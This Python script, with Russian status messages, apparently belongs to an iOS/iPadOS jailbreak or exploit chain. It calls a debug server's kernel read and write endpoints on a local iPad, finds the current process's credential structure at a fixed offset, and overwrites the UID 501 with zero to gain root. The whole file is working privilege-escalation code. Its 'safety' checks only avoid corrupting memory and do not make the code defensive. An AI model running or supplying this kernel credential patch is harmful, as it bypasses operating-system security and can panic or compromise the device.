#!/usr/bin/env python3
"""
safe_root_final.py

Safe, minimal script to attempt turning the current process UID->0 after a device reboot.

USAGE: run this AFTER reboot and after the debug server (Lara/MobiServer) is up.

Behavior:
 - GET /api/v1/ds -> read `ourproc` (exact key `ourproc`).
 - Compute `uid_addr = ourproc + 0x30` (trusted offset).
 - Read 8 bytes from `uid_addr` and check if 0x1F5 (501) appears in lower or upper 32 bits.
 - If match found: attempt to write 32-bit zero to the appropriate 32-bit slot.
 - Verify by GET /api/v1/ids.

Safety:
 - Do NOT scan memory or write to any address outside `ourproc .. ourproc+SAFE_WINDOW`.
 - If the 64-bit read doesn't contain expected pattern, do NOT write.
"""

import sys
import time
import requests

BASE_URL = "http://192.168.1.5:8686"
DS_ENDPOINT = "/api/v1/ds"
KREAD_ENDPOINT = "/api/v1/kread"
KWRITE_ENDPOINT = "/api/v1/kwrite"
IDS_ENDPOINT = "/api/v1/ids"

UID_OFFSET = 0x30
SAFE_WINDOW = 0x1000
EXPECTED_PATTERN = 0x1F5


def parse_addr(val):
    if val is None:
        return None
    if isinstance(val, int):
        return val
    if isinstance(val, str):
        s = val.strip()
        try:
            if s.startswith("0x") or s.startswith("0X"):
                return int(s, 16)
            return int(s)
        except Exception:
            return None
    return None


def kread(session, addr, size=8):
    url = BASE_URL + KREAD_ENDPOINT
    payloads = [{"addr": hex(addr), "size": size}, {"address": hex(addr), "size": size}]
    for p in payloads:
        try:
            r = session.post(url, json=p, timeout=5)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        try:
            j = r.json()
        except Exception:
            # try raw
            try:
                raw = r.content
                if raw:
                    return int.from_bytes(raw[:size], "little")
            except Exception:
                return None
        # common fields
        if isinstance(j, dict):
            for k in ("value", "val", "data", "result"):
                if k in j:
                    v = j[k]
                    if isinstance(v, int):
                        return v
                    if isinstance(v, str) and v.startswith(("0x", "0X")):
                        try:
                            return int(v, 16)
                        except Exception:
                            pass
        if isinstance(j, int):
            return j
        if isinstance(j, str) and j.startswith(("0x", "0X")):
            try:
                return int(j, 16)
            except Exception:
                pass
    return None


def kwrite(session, addr, value, size=4):
    url = BASE_URL + KWRITE_ENDPOINT
    payloads = [
        {"addr": hex(addr), "value": value, "size": size},
        {"addr": hex(addr), "data": hex(value), "size": size},
        {"address": hex(addr), "data": hex(value), "size": size},
    ]
    for p in payloads:
        try:
            r = session.post(url, json=p, timeout=5)
        except Exception as e:
            print(f"POST {KWRITE_ENDPOINT} exception for payload {p}: {e}")
            continue
        if r.status_code != 200:
            print(f"POST {KWRITE_ENDPOINT} returned {r.status_code}: {r.text}")
            continue
        try:
            j = r.json()
            if isinstance(j, dict) and (j.get("success") is True or j.get("ok") is True or j.get("result") == "ok"):
                return True
        except Exception:
            # assume 200 with no JSON is success
            return True
    return False


def get_ids(session):
    try:
        r = session.get(BASE_URL + IDS_ENDPOINT, timeout=5)
    except Exception:
        return None
    if r.status_code != 200:
        return None
    try:
        j = r.json()
    except Exception:
        return None
    # look for uid fields
    for k in ("uid", "euid", "ruid", "effective_uid"):
        if k in j:
            return j[k]
    # try find any int value
    if isinstance(j, dict):
        for v in j.values():
            if isinstance(v, int):
                return v
    if isinstance(j, int):
        return j
    return None


def main():
    session = requests.Session()

    # 1) GET /api/v1/ds
    try:
        r = session.get(BASE_URL + DS_ENDPOINT, timeout=5)
    except Exception as e:
        print("Ошибка: не удалось связаться с сервером /api/v1/ds:", e)
        print("SERVER DEAD. Перезагрузите iPad и запустите этот скрипт снова после старта MobiServer.")
        sys.exit(1)
    if r.status_code != 200:
        print(f"GET /api/v1/ds returned {r.status_code}: {r.text}")
        print("SERVER DEAD. Перезагрузите iPad и запустите этот скрипт снова после старта MobiServer.")
        sys.exit(1)

    try:
        ds = r.json()
    except Exception:
        ds = None

    ourproc = None
    if isinstance(ds, dict) and "ourproc" in ds:
        ourproc = parse_addr(ds["ourproc"])
    if ourproc is None:
        print("Не удалось получить `ourproc` из /api/v1/ds; ответ:", r.text)
        sys.exit(1)

    print(f"Чтение ourproc: 0x{ourproc:x}")

    uid_addr = ourproc + UID_OFFSET
    print(f"Вычисленный адрес uid_addr = 0x{uid_addr:x}")

    # Safety window check
    if not (ourproc <= uid_addr < ourproc + SAFE_WINDOW):
        print("Адрес вне безопасного окна; отмена.")
        sys.exit(1)

    # Read 8 bytes
    print(f"Чтение 8 байт по адресу 0x{uid_addr:x}...")
    val64 = kread(session, uid_addr, size=8)
    if val64 is None:
        print("Не удалось прочитать 8 байт; отмена.")
        sys.exit(1)
    print(f"Найдено (uint64): 0x{val64:016x}")

    low32 = val64 & 0xFFFFFFFF
    high32 = (val64 >> 32) & 0xFFFFFFFF
    print(f"low32=0x{low32:08x}, high32=0x{high32:08x}")

    target_slot = None
    if low32 == EXPECTED_PATTERN or (low32 & 0xFFFFFFFF) == EXPECTED_PATTERN:
        target_slot = (uid_addr, 4)  # addr, size
        print(f"Pattern {EXPECTED_PATTERN} found in low32 (UID). Will attempt 32-bit write to 0x{uid_addr:x}.")
    elif high32 == EXPECTED_PATTERN or (high32 & 0xFFFFFFFF) == EXPECTED_PATTERN:
        target_slot = (uid_addr + 4, 4)
        print(f"Pattern {EXPECTED_PATTERN} found in high32 (GID). Will attempt 32-bit write to 0x{uid_addr+4:x}.")
    else:
        # Also check if pattern appears anywhere in the full 64-bit hex
        if '1f5' in f"{val64:x}".lower():
            print("Pattern '1f5' found inside 64-bit value; proceeding with caution and targeting low32 first.")
            target_slot = (uid_addr, 4)
        else:
            print("64-bit word does not contain expected UID/GID pattern; aborting to avoid corrupt writes.")
            sys.exit(1)

    addr_to_write, write_size = target_slot
    # Perform write
    print(f"Запись {write_size*8}-bit zero по адресу 0x{addr_to_write:x}...")
    ok = kwrite(session, addr_to_write, 0, size=write_size)
    if not ok:
        print("Запись не удалась. Возможна паника ядра или требование иного формата payload.")
        print("Проверьте логи сервера и перезагрузите устройство при необходимости.")
        sys.exit(1)
    print("Запись выполнена. Проверяем /api/v1/ids...")

    # small delay
    time.sleep(0.2)
    ids = get_ids(session)
    if ids is None:
        print("Не удалось получить /api/v1/ids после записи — возможно паника ядра. Проверьте устройство.")
        sys.exit(1)
    try:
        uid_int = int(ids)
    except Exception:
        uid_int = parse_addr(ids)

    print(f"GET /api/v1/ids -> {ids}")
    if uid_int == 0:
        print("TEST PASSED: UID == 0")
    else:
        print(f"TEST FAILED: UID == {uid_int}")


if __name__ == "__main__":
    main()
